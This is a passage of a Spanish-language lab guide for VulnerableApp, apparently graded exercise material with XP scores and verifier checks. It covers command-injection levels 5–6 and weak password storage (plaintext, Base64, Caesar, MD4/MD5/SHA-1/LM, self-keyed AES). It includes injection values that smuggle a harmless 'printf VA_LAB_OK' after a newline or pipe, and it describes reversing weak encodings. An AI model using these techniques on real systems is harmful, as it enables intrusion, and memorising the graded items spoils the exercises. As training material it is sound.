La evidencia es específica a este marcador y no equivale a una medición de impacto general.

**Corrección recomendada:** Usar ProcessBuilder con argumentos no interpretados y una allowlist; no intentar mantener una lista de metacaracteres supuestamente completa.

### commandInjection-09 · LEVEL_5 — control negativo antes de probar el salto de línea

Respuesta 200 JSON con salida de ping variable o vacía, sin VA_LAB_OK.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

El control establece el comportamiento normal del nivel que ya bloquea el pipe codificado. No se usa una orden de prueba ni un destino adicional.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_5 --data-urlencode 'ipaddress=127.0.0.1'
```

Comprobar que $.content no contiene VA_LAB_OK.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-09 --method GET --param ipaddress=127.0.0.1

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "VA_LAB_OK",
  "path": "content"
}
```

**Pistas:**

El control no necesita conocer el texto exacto que imprime ping.

No concluyas que el filtro es seguro solo porque un pipe queda bloqueado.

La comparación válida es contra el positivo de salto de línea del mismo endpoint.

**Corrección recomendada:** Eliminar el intérprete de comandos y validar el dato como una IP antes de crear el proceso; aplicar timeout y límites de salida.

### commandInjection-10 · LEVEL_5 — salto de línea codificado con marcador fijo

curl codifica el salto de línea como %0A; como LEVEL_5 no lo comprueba y sí concatena en sh -c, content debería contener VA_LAB_OK si el target conserva esa representación y el proceso se ejecuta.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Este es el caso seguro representativo del comentario fuente de LEVEL_5: el salto de línea separa el ping del printf sin usar ;, &, espacio literal ni %7C. El marcador es un builtin sin efectos laterales y se comprueba solo en la respuesta JSON.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_5 --data-urlencode $'ipaddress=127.0.0.1\nprintf VA_LAB_OK'
```

Verificar VA_LAB_OK en $.content. Si no aparece, revisar solo la URL codificada y la respuesta; no sustituir el salto por otra orden o separador.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-10 --method GET --param 'ipaddress=127.0.0.1
printf VA_LAB_OK'

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "VA_LAB_OK",
  "path": "content"
}
```

El verificador también ejecuta y contrasta este control definido por el servidor:

```json
{
  "route": "CommandInjection/LEVEL_5",
  "method": "GET",
  "params": {
    "ipaddress": "127.0.0.1"
  },
  "headers": {},
  "body": null,
  "content_type": null,
  "check": {
    "kind": "not_contains",
    "value": "VA_LAB_OK",
    "path": "content"
  }
}
```

**Pistas:**

La sintaxis $'...' es de Bash/Kali y convierte \n en un salto de línea real antes de que curl lo codifique.

El valor contiene únicamente una dirección local y printf VA_LAB_OK.

Un resultado sin marcador puede deberse a normalización del proxy, ausencia de ping o diferencias de despliegue; no se debe prometer éxito sin ejecutar en el target.

**Corrección recomendada:** No construir una orden de shell con entrada de usuario. Permitir únicamente una IP parseada y pasarla como argumento individual; una blacklist de codificaciones no cubre saltos de línea y otras sintaxis.

### commandInjection-11 · LEVEL_6 — control positivo legítimo de la lista permitida

Respuesta 200 JSON con isValid=true y content de ping variable o vacío según la imagen; no contiene VA_LAB_OK. La IPv4 completa satisface IP_ADDRESS_PATTERN.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

Este control verifica que LEVEL_6 no rompe la funcionalidad prevista para una IPv4 y que la ruta segura todavía intenta ping. No prueba por sí solo que el shell haya desaparecido, porque el código aún lo usa internamente.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_6 --data-urlencode 'ipaddress=127.0.0.1'
```

Comprobar ausencia de VA_LAB_OK en $.content y observar que una respuesta 200/isValid=true solo confirma el contrato HTTP, no la seguridad completa.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-11 --method GET --param ipaddress=127.0.0.1

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "VA_LAB_OK",
  "path": "content"
}
```

**Pistas:**

127.0.0.1 es una IPv4 aceptada por la expresión del código.

La salida de ping no es un valor estable entre imágenes.

Usa este resultado como control frente al intento de inyección siguiente.

**Corrección recomendada:** Conservar la validación positiva como defensa en profundidad, pero reemplazar además sh -c por ejecución con argumentos separados y timeout.

### commandInjection-12 · LEVEL_6 — control de rechazo del marcador de inyección

La entrada no coincide con la IPv4 ni con localhost; el método no debe crear el proceso y debe devolver 200 JSON con content exactamente vacío e isValid=true. El marcador no debe aparecer.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El mismo payload que funciona en LEVEL_1–LEVEL_4 no satisface la allowlist de LEVEL_6. El check JSON sobre content vacío es más informativo que comprobar solo el estado HTTP, pero no demuestra que cualquier variante imaginable esté bloqueada.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_6 --data-urlencode 'ipaddress=127.0.0.1|printf VA_LAB_OK'
```

Comprobar que la ruta responde JSON y que $.content es la cadena vacía; confirmar también que no contiene VA_LAB_OK.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-12 --method GET --param 'ipaddress=127.0.0.1|printf VA_LAB_OK'

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": "",
  "path": "content"
}
```

**Pistas:**

El pipe está dentro del parámetro, pero la expresión de IPv4 no permite ese carácter.

No interpretes isValid=true como aceptación de la dirección: el constructor del bean lo fija siempre a true.

Contrasta este resultado con el positivo del mismo marcador en LEVEL_4 o con el control de LEVEL_5, sin ejecutar payloads adicionales.

**Corrección recomendada:** Mantener una allowlist robusta, preferiblemente con un parser de IP, ejecutar sin shell y cubrir variantes de entrada en tests de integración. No exponer isValid=true como señal de que la solicitud fue aceptada semánticamente.

### Límites de esta familia

[
  "El análisis está limitado al commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y a la familia commandInjection. No se modificó código ni se investigaron otras familias.",
  "No hay un archivo específico de commandInjection bajo src/main/resources/attackvectors en este checkout; la familia declara textos y payloads mediante anotaciones ChallengeCard, mientras expectedIssues.csv solo registra CWE-77 en las líneas 48 y 53 de CommandInjection.java. No se inventan recursos ausentes.",
  "La evidencia de los ejercicios es verificación estática del flujo y comandos curl reproducibles; no se ejecutó el target autorizado durante la elaboración. La presencia del marcador depende de que el contenedor tenga ping, de la configuración del perfil unsafe y de que ningún proxy normalice la URL antes de que RequestEntity sea inspeccionado.",
  "Los tests dedicados mockean getResponseFromPingCommand y por ello prueban validators y contratos de respuesta, no una ejecución de shell real. Sus URI de prueba conservan codificaciones como %7C, %3B y %0A; un despliegue puede representarlas de otra manera.",
  "contains VA_LAB_OK es evidencia acotada de que el flujo alcanzó ese printf benigno; no es una autorización para probar órdenes arbitrarias ni prueba por sí misma de RCE general. Un HTTP 200 o isValid=true tampoco prueba ejecución.",
  "El frontend usa innerHTML para renderizar content, pero estos ejercicios no califican XSS. Un reflejo no prueba ejecución XSS; un 200 no prueba IDOR; y no se atribuye puntaje por hacer clic en la interfaz. La comprobación recomendada es leer el JSON y aplicar el objeto check indicado.",
  "No se usan receptor, Mailpit, archivos del host, secretos, órdenes de red, reverse shells, cargas de DoS ni borrado de datos: para commandInjection el único efecto intencional del payload es el marcador printf VA_LAB_OK."
]

## Fallos criptográficos y contraseñas

Familia que demuestra almacenamiento o protección inadecuada de contraseñas: texto plano, codificación reversible, cifrados débiles o caseros, hashes obsoletos/rápidos/sin salt, una clave AES derivada de la propia contraseña y, como control seguro, BCrypt adaptativo. El controlador de la familia está anotado como CryptographicFailures y cada método usa VulnerableAppRequestMapping con el nivel correspondiente; por ello el controlador central expone /VulnerableApp/{nombre}/{LEVEL}, es decir, /VulnerableApp/CryptographicFailures/LEVEL_N. Las operaciones son GET por defecto y reciben un mapa de parámetros de consulta; solo se utiliza password. El JSON de respuesta contiene content e isValid. En LEVEL_1 a LEVEL_10 isValid refleja si la conjetura coincide; en LEVEL_11 el caso sin password devuelve isValid=true para señalar la variante segura, no porque se haya validado una contraseña.

### Todos los niveles originales

#### `GET /VulnerableApp/CryptographicFailures/LEVEL_1`

**Entrada:** {
  "password": "opcional; si falta o es vacío se devuelve la instrucción del reto; si coincide con el valor claro almacenado, isValid=true"
}

Consulta el secreto de level 1 y compara directamente password con el valor guardado en VaultEntity. Sin parámetro devuelve un reto genérico que no incluye el secreto; con una conjetura incorrecta devuelve Incorrect; con el texto exacto almacenado devuelve Correct.

El seeder genera una contraseña aleatoria de 10 caracteres y la guarda como CLEARTEXT. El esquema concede SELECT a cryptographic_failures_user para exploración del laboratorio. El test confirma que la respuesta sin password no contiene la contraseña y que una contraseña conocida del repositorio resuelve el reto; no se debe interpretar el 200 como protección.

#### `GET /VulnerableApp/CryptographicFailures/LEVEL_2`

**Entrada:** {
  "password": "opcional; el valor enviado se codifica con Base64 y se compara con el valor guardado"
}

Sin password concatena en content el valor Base64 almacenado. Con password calcula EncodingUtils.encodeBase64(password), por lo que la comprobación es reversible y no es cifrado.

El seeder genera una contraseña aleatoria de 10 caracteres y almacena solo su Base64. El valor mostrado es un reto del propio laboratorio, no un secreto del host; decodificarlo localmente no requiere atacar otro servicio. No hay test unitario de controlador específico para este nivel en los archivos inspeccionados.

#### `GET /VulnerableApp/CryptographicFailures/LEVEL_3`

**Entrada:** {
  "password": "opcional; se transforma con Caesar shift 3 antes de comparar"
}

Sin password muestra el ciphertext Caesar. Con password calcula EncryptionUtils.caesarCipher(password, 3) y compara el resultado con lo almacenado.

El seeder genera una contraseña alfanumérica aleatoria de 10 caracteres y aplica CAESAR. El espacio de búsqueda es pequeño y determinista; el reto de messages.properties indica revertir el desplazamiento. No hay test unitario de controlador específico para este nivel en los archivos inspeccionados.

#### `GET /VulnerableApp/CryptographicFailures/LEVEL_4`

**Entrada:** {
  "password": "opcional; se transforma mediante customCipher antes de comparar"
}

Sin password muestra el valor producido por la lógica custom. Con password calcula EncryptionUtils.customCipher(password) y compara el resultado.

El seeder genera una contraseña aleatoria de 12 caracteres y la almacena como CUSTOM. Las pistas del recurso i18n describen una transformación familiar seguida de otra transformación simple, pero la implementación de EncryptionUtils está fuera de la familia solicitada y no se ha inferido aquí más allá de su llamada. Es seguridad por obscuridad, no una construcción criptográfica revisable en este controlador; no hay test unitario específico de este nivel.

#### `GET /VulnerableApp/CryptographicFailures/LEVEL_5`

**Entrada:** {
  "password": "opcional; se calcula MD4(password) y se compara con el hash almacenado"
}

Sin password muestra el MD4. Con password calcula PasswordHashingUtils.md4Hex(password), devuelve el hash calculado en caso incorrecto y marca isValid=true si coincide.

El seeder selecciona aleatoriamente una contraseña de COMMON_PASSWORDS y guarda MD4 sin salt. El test de seeder confirma que el hash coincide con al menos una candidata de esa lista; el test de controlador confirma acierto con riverside123! y rechazo de wrong. El ejercicio no necesita servicios externos de búsqueda.

#### `GET /VulnerableApp/CryptographicFailures/LEVEL_6`

**Entrada:** {
  "password": "opcional; se calcula MD5(password) y se compara con el hash almacenado"
}

Sin password muestra el MD5. Con password calcula PasswordHashingUtils.md5Hex(password), expone el hash de la conjetura cuando falla y devuelve isValid=true cuando coincide.

El seeder elige una contraseña común de la lista fija y la guarda como MD5 sin salt. Los tests de seeder y controlador confirman el patrón con una candidata conocida. MD5 no debe usarse para almacenamiento de contraseñas aunque un resultado HTTP 200 sea normal.

#### `GET /VulnerableApp/CryptographicFailures/LEVEL_7`

**Entrada:** {
  "password": "opcional; se calcula SHA-1(password) y se compara con el hash almacenado"
}

Sin password muestra el SHA-1. Con password calcula PasswordHashingUtils.sha1Hex(password), retorna el hash de la entrada incorrecta y valida la coincidencia exacta.

El seeder guarda SHA-1 sin salt de una contraseña común elegida al azar. Los tests confirman que una candidata de COMMON_PASSWORDS puede producir el hash guardado y que riverside123! funciona en el escenario mockeado. SHA-1 está obsoleto para contraseñas.

#### `GET /VulnerableApp/CryptographicFailures/LEVEL_8`

**Entrada:** {
  "password": "opcional; se calcula LM(password) y se compara con el hash almacenado"
}

Sin password muestra el LM hash. Con password calcula PasswordHashingUtils.lmHash(password) y compara; la propia función LM hace que el caso de la contraseña no aporte seguridad en el escenario probado.

El método se llama getSecurePayloadLevel5, pero el mapping es LEVEL_8 y su variante por defecto sigue siendo UNSECURE. El seeder elige una contraseña común de hasta 14 caracteres. El test confirma que la misma contraseña en mayúsculas también valida, además del caso correcto y el incorrecto.

#### `GET /VulnerableApp/CryptographicFailures/LEVEL_9`

**Entrada:** {
  "password": "opcional; se calcula SHA-256 sin salt y se compara con el hash almacenado"
}

Sin password muestra el hash SHA-256. Con password calcula PasswordHashingUtils.unsaltedSha256Hex(password), devuelve el hash de la entrada si falla y valida igualdad si acierta.

SHA-256 no está roto como función general, pero en este uso es rápido, sin salt y no es un KDF de contraseñas. El seeder utiliza una contraseña común aleatoria; el test de seeder confirma que es candidata a la lista fija y el test de controlador cubre acierto y fallo.

#### `GET /VulnerableApp/CryptographicFailures/LEVEL_10`

**Entrada:** {
  "password": "opcional; se usa a la vez como texto plano y como material para derivar la clave AES-128"
}

Sin password muestra el ciphertext. Con password calcula EncryptionUtils.encrypt(password, EncryptionUtils.getKeyFromPassword(password)) y compara con el valor guardado.

Aunque AES-128 es un algoritmo fuerte en abstracto, el seeder fija level10Secret en aa123456 y cifra ese texto con una clave derivada de la misma contraseña. La debilidad es la reutilización/derivación predecible de la clave y el almacenamiento reversible, no AES por sí mismo. El código aporta un valor positivo determinista; no hay test unitario de controlador de este nivel en los archivos inspeccionados.

#### `GET /VulnerableApp/CryptographicFailures/LEVEL_11`

**Entrada:** {
  "password": "opcional; si existe se valida con isValidBcrypt contra el hash almacenado"
}

Sin password devuelve un mensaje SECURE CHALLENGE, el hash y el work factor, con isValid=true para marcar la variante segura. Con password usa PasswordHashingUtils.isValidBcrypt; acierto devuelve Correct y fallo devuelve Incorrect con explicación del coste adaptativo.

El mapping declara variant=Variant.SECURE. El seeder genera una contraseña aleatoria de 15 caracteres y un hash BCrypt con salt y factor de trabajo de la utilidad. El test de controlador inspeccionado no cubre LEVEL_11; el valor isValid=true sin password no es una contraseña aceptada y no debe puntuarse como tal.

### cryptographicFailures-01 · LEVEL_1 — comprobar el reto de texto plano sin exponer un secreto en la respuesta

La petición sin parámetro debe devolver JSON 200 con el texto de reto sobre almacenamiento en texto plano y isValid=false; la petición de control con VA_LAB_WRONG también debe ser rechazada. El código no devuelve el texto plano en la primera respuesta, aunque el diseño inseguro permite que exista en el almacén del módulo.
Objetivo puntuable: resolver el reto actual y enviar password correcta. Abrir el reto o enviar VA_LAB_WRONG no entrega puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El handler compara directamente contra VaultEntity.password. El control negativo solo verifica el contrato de rechazo; la evidencia de la vulnerabilidad es el almacenamiento CLEARTEXT del seeder/esquema y no el estado HTTP.

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_1 -H 'Accept: application/json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_1 -H 'Accept: application/json' --data-urlencode 'password=VA_LAB_WRONG'
```

Compara content con el marcador del reto e inspecciona /isValid. No infieras una vulnerabilidad solo por HTTP 200; la evidencia está en el código y el seeder. Si el laboratorio proporciona explícitamente un valor de entrenamiento de la base de datos de la aplicación, una comprobación positiva separada puede enviarlo con --data-urlencode 'password=VALOR_DEL_LAB', pero este informe no lo inventa porque la semilla es aleatoria.

Registrar la misma prueba con el cliente del laboratorio:
lab request cryptographicFailures-01 --method GET --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

El valor de LEVEL_1 se genera aleatoriamente en cada seed; no uses un valor hard-coded como supuesto positivo.

La prueba de código afirma que la respuesta sin password no contiene la contraseña; no conviertas la ausencia de reflejo en prueba de almacenamiento seguro.

**Corrección recomendada:** No almacenar contraseñas reversibles ni en texto plano. Usar un KDF adaptativo moderno como Argon2id, scrypt o BCrypt con salt único por contraseña, y restringir la cuenta de base de datos a los permisos mínimos.

### cryptographicFailures-02 · LEVEL_2 — distinguir Base64 de cifrado

La respuesta sin password debe incluir el reto y un valor Base64 almacenado, con isValid=false. Un control con VA_LAB_WRONG debe seguir siendo false; una contraseña decodificada del valor del reto, si se obtiene solo dentro del laboratorio, sería la comprobación positiva prevista por el código.
Objetivo puntuable: resolver el reto actual y enviar password correcta. Abrir el reto o enviar VA_LAB_WRONG no entrega puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El servidor concatena el valor codificado en content y después vuelve a codificar cada conjetura con EncodingUtils.encodeBase64. Base64 es reversible y no aporta confidencialidad.

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_2 -H 'Accept: application/json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_2 -H 'Accept: application/json' --data-urlencode 'password=VA_LAB_WRONG'
```

Decodifica localmente, sin contactar servicios externos, únicamente el valor Base64 mostrado por la respuesta de este laboratorio; después, si lo deseas, pruébalo con curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_2 --data-urlencode 'password=VALOR_DECODIFICADO_DEL_LAB'. El informe no afirma que el marcador de posición sea un valor exitoso.

Registrar la misma prueba con el cliente del laboratorio:
lab request cryptographicFailures-02 --method GET --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

El seeder aplica EncodingUtils.encodeBase64(genPassword(10)); no hay salt ni clave secreta.

Un 200 y el texto reflejado no prueban por sí solos una vulnerabilidad; aquí el indicio verificable es la operación Base64 en el código y el valor codificado entregado por el propio reto.

**Corrección recomendada:** Usar un KDF adaptativo con salt para contraseñas; si se necesita cifrar un secreto recuperable, usar un AEAD moderno con claves separadas y gestionadas fuera del dato protegido.

### cryptographicFailures-03 · LEVEL_3 — observar un cifrado Caesar determinista

La petición sin password debe mostrar el ciphertext del reto y isValid=false. La conjetura VA_LAB_WRONG debe devolver isValid=false. El valor correcto depende de la semilla aleatoria; no se promete una coincidencia sin recuperar/revertir el ciphertext del mismo laboratorio.
Objetivo puntuable: resolver el reto actual y enviar password correcta. Abrir el reto o enviar VA_LAB_WRONG no entrega puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El código solo aplica un desplazamiento Caesar de 3 a la entrada y compara una salida determinista. La cantidad de desplazamientos posibles es pequeña y el propio reto pide revertir el corrimiento.

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_3 -H 'Accept: application/json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_3 -H 'Accept: application/json' --data-urlencode 'password=VA_LAB_WRONG'
```

Revierte localmente el desplazamiento fijo sobre el ciphertext mostrado por este laboratorio y, solo si obtienes una candidata, pruébala con curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_3 --data-urlencode 'password=CANDIDATO_LOCAL_DEL_LAB'.

Registrar la misma prueba con el cliente del laboratorio:
lab request cryptographicFailures-03 --method GET --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

El método usa exactamente caesarCipher(password, 3); la semilla de LEVEL_3 no es fija en CryptographicFailuresSeeder.

La comprobación positiva depende del ciphertext actual y debe ser reportada como resultado observado, no como promesa previa.

**Corrección recomendada:** Eliminar cifrados caseros o de sustitución. Para contraseñas usar un KDF adaptativo con salt; para datos recuperables usar una biblioteca AEAD mantenida, con claves independientes y gestión de claves adecuada.

### cryptographicFailures-04 · LEVEL_4 — identificar seguridad por obscuridad en el cifrado custom

La respuesta sin password debe incluir el reto y el valor transformado, con isValid=false; VA_LAB_WRONG debe fallar. La recuperación positiva queda condicionada a invertir localmente la transformación exacta usada por EncryptionUtils y a usar la semilla del laboratorio.
Objetivo puntuable: resolver el reto actual y enviar password correcta. Abrir el reto o enviar VA_LAB_WRONG no entrega puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La verificación depende de una función customCipher y la semilla guarda solo su salida. Ocultar el algoritmo no sustituye una construcción criptográfica segura; el detalle de la transformación debe tratarse como incertidumbre de implementación fuera del controlador de esta familia.

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_4 -H 'Accept: application/json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_4 -H 'Accept: application/json' --data-urlencode 'password=VA_LAB_WRONG'
```

Trata el valor transformado mostrado solo como dato del laboratorio. Si conoces la inversa local exacta de la compilación autorizada, envía la candidata resultante con curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_4 --data-urlencode 'password=CANDIDATO_LOCAL_DEL_LAB'; no infieras éxito solo por el status.

Registrar la misma prueba con el cliente del laboratorio:
lab request cryptographicFailures-04 --method GET --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

messages.properties sugiere probar primero Base64 y después una transformación simple, pero este informe no afirma una implementación de EncryptionUtils no inspeccionada.

Un reflejo del ciphertext o un 200 no demuestra que se haya recuperado la contraseña.

**Corrección recomendada:** No diseñar criptografía propia. Separar hashing de contraseñas de cifrado de datos y adoptar primitivas auditadas, claves independientes, almacenamiento seguro de claves y rotación.

### cryptographicFailures-05 · LEVEL_5 — control seguro de solicitud y evidencia de MD4 débil

La petición inicial sin password expone el formato/hash MD4 del reto y isValid=false; la conjetura VA_LAB_WRONG devuelve el hash de esa entrada y también isValid=false. El valor correcto es aleatorio entre COMMON_PASSWORDS y no se afirma aquí.
Objetivo puntuable: resolver el reto actual y enviar password correcta. Abrir el reto o enviar VA_LAB_WRONG no entrega puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El seeder selecciona una contraseña de una lista corta y la transforma con MD4 sin salt. El test de seeder verifica que el hash pertenece a esa lista, y el test de controlador verifica un acierto/fracaso en un escenario mockeado.

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_5 -H 'Accept: application/json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_5 -H 'Accept: application/json' --data-urlencode 'password=VA_LAB_WRONG'
```

Inspecciona /isValid y confirma que la respuesta de entrada incorrecta contiene el MD4 del marcador enviado; es un control negativo, no una afirmación de que se haya crackeado MD4.

Registrar la misma prueba con el cliente del laboratorio:
lab request cryptographicFailures-05 --method GET --param password=VA_LAB_WRONG --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

La lista de candidatas está en CryptographicFailuresSeeder.COMMON_PASSWORDS; no uses herramientas externas ni listas de terceros.

La respuesta 200 es normal para el diseño y no es evidencia suficiente por sí misma.

**Corrección recomendada:** Migrar a Argon2id, scrypt o BCrypt con salt único y factor de trabajo calibrado; invalidar y rehashear credenciales antiguas tras autenticación o forzar rotación.

### cryptographicFailures-06 · LEVEL_6 — control negativo frente a MD5 sin salt

Sin password se observa el reto que identifica MD5 y un hash; con VA_LAB_WRONG la respuesta debe ser isValid=false y mostrar el MD5 calculado de la entrada. La selección positiva real depende de la semilla del laboratorio.
Objetivo puntuable: resolver el reto actual y enviar password correcta. Abrir el reto o enviar VA_LAB_WRONG no entrega puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

MD5 es rápido, sin salt y criptográficamente inadecuado para contraseñas. El seeder usa una candidata común aleatoria y el test confirma que una candidata de la lista puede resolver el hash en el fixture correspondiente.

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_6 -H 'Accept: application/json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_6 -H 'Accept: application/json' --data-urlencode 'password=VA_LAB_WRONG'
```

Usa la primera respuesta solo para identificar el reto/hash y la segunda como control negativo; no llames servicios externos de consulta de hashes.

Registrar la misma prueba con el cliente del laboratorio:
lab request cryptographicFailures-06 --method GET --param password=VA_LAB_WRONG --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

El comportamiento positivo se prueba con una candidata de COMMON_PASSWORDS solo si se conoce cuál salió en el seed actual.

No otorgar crédito por ver un hash hexadecimal o por recibir HTTP 200: la comprobación debe leer el JSON y relacionarlo con el código.

**Corrección recomendada:** Reemplazar MD5 por un KDF adaptativo con salt por registro y límites de intento; no reutilizar un hash rápido aunque el hash no sea directamente reversible en todos los casos.

### cryptographicFailures-07 · LEVEL_7 — observar SHA-1 sin salt y su control de fallo

La respuesta inicial identifica SHA1 y entrega el hash del reto con isValid=false; la petición con VA_LAB_WRONG debe devolver isValid=false y el hash de la entrada. El código no fija cuál de las contraseñas comunes fue sembrada.
Objetivo puntuable: resolver el reto actual y enviar password correcta. Abrir el reto o enviar VA_LAB_WRONG no entrega puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El handler usa sha1Hex directamente y el seeder no añade salt. Los tests cubren una candidata de ejemplo y validan que el hash proviene de la lista común.

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_7 -H 'Accept: application/json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_7 -H 'Accept: application/json' --data-urlencode 'password=VA_LAB_WRONG'
```

Compara /isValid entre la conjetura incorrecta controlada y cualquier candidata elegida intencionadamente en el laboratorio; no declares que hubo coincidencia salvo que la respuesta diga realmente Correct.

Registrar la misma prueba con el cliente del laboratorio:
lab request cryptographicFailures-07 --method GET --param password=VA_LAB_WRONG --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

SHA-1 está deprecado para almacenamiento de contraseñas por ser rápido y no tener salt en este diseño.

El texto de error expone el hash de la entrada, pero esa reflexión no prueba una ejecución adicional ni una lectura externa.

**Corrección recomendada:** No usar SHA-1 para contraseñas. Migrar a Argon2id/scrypt/BCrypt con salt único, factor de trabajo y política de rehash.

### cryptographicFailures-08 · LEVEL_8 — comprobar el comportamiento de LM y la pérdida de sensibilidad a mayúsculas

Sin password se muestra el reto LM con isValid=false; VA_LAB_WRONG debe fallar. Si se dispone de la misma candidata de COMMON_PASSWORDS en el seed actual, compararla en forma original y en mayúsculas es un control positivo/negativo del comportamiento case-insensitive, pero no se inventa aquí una coincidencia.
Objetivo puntuable: resolver el reto actual y enviar password correcta. Abrir el reto o enviar VA_LAB_WRONG no entrega puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

LM tiene límites históricos de longitud y divide el material en mitades; el test del repositorio verifica específicamente que password y password.toUpperCase() sean válidos para el mismo hash mockeado.

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_8 -H 'Accept: application/json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_8 -H 'Accept: application/json' --data-urlencode 'password=VA_LAB_WRONG'
```

Solo cuando conozcas una candidata legítima de la semilla de este laboratorio, envíala y envía su forma en mayúsculas con curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_8 --data-urlencode 'password=CANDIDATO_DEL_LAB' y después --data-urlencode 'password=CANDIDATO_DEL_LAB_EN_MAYUSCULAS'.

Registrar la misma prueba con el cliente del laboratorio:
lab request cryptographicFailures-08 --method GET --param password=VA_LAB_WRONG --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

El nombre Java getSecurePayloadLevel5 es un nombre engañoso; la anotación es LEVEL_8 y no tiene variant=SECURE.

No pruebes contraseñas fuera de la lista controlada ni hagas ráfagas; el objetivo es verificar el algoritmo descrito y el caso de mayúsculas.

**Corrección recomendada:** Eliminar LM y cualquier formato heredado. Al migrar, forzar restablecimiento o validar contra un KDF moderno con salt, longitud completa y sensibilidad de contraseña definida explícitamente.

### cryptographicFailures-09 · LEVEL_9 — distinguir SHA-256 general de un KDF de contraseñas

La respuesta sin password debe mostrar el reto y un SHA-256 sin salt; la conjetura VA_LAB_WRONG debe producir isValid=false y devolver el hash de la conjetura. La fortaleza de SHA-256 como hash general no convierte este uso rápido en almacenamiento seguro.
Objetivo puntuable: resolver el reto actual y enviar password correcta. Abrir el reto o enviar VA_LAB_WRONG no entrega puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El seeder usa unsaltedSha256Hex sobre una contraseña común. El test verifica tanto la pertenencia a COMMON_PASSWORDS como el resultado correcto/incorrecto en el handler.

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_9 -H 'Accept: application/json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_9 -H 'Accept: application/json' --data-urlencode 'password=VA_LAB_WRONG'
```

Usa la respuesta solo como control negativo a nivel de aplicación. Un resultado positivo requiere una candidata real de la semilla actual y solo debe registrarse si /isValid es true.

Registrar la misma prueba con el cliente del laboratorio:
lab request cryptographicFailures-09 --method GET --param password=VA_LAB_WRONG --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

La ausencia de salt hace iguales las salidas para iguales contraseñas y facilita tablas/precomputación; la lentitud adaptativa es la propiedad que falta.

No atribuir un hallazgo por el status code: comprobar content e isValid.

**Corrección recomendada:** Usar Argon2id, scrypt o BCrypt con salt único y coste adaptativo; nunca usar SHA-256 directo como función de derivación de contraseñas.

### cryptographicFailures-10 · LEVEL_10 — control positivo determinista de clave AES derivada de la propia contraseña

Con password=aa123456 el código del seeder y del handler deben producir la misma comparación positiva, con isValid=true y content que indica que la contraseña fue aa123456. El control VA_LAB_WRONG debe devolver isValid=false; no se afirma ejecución en el target, solo lo que se deriva del código.
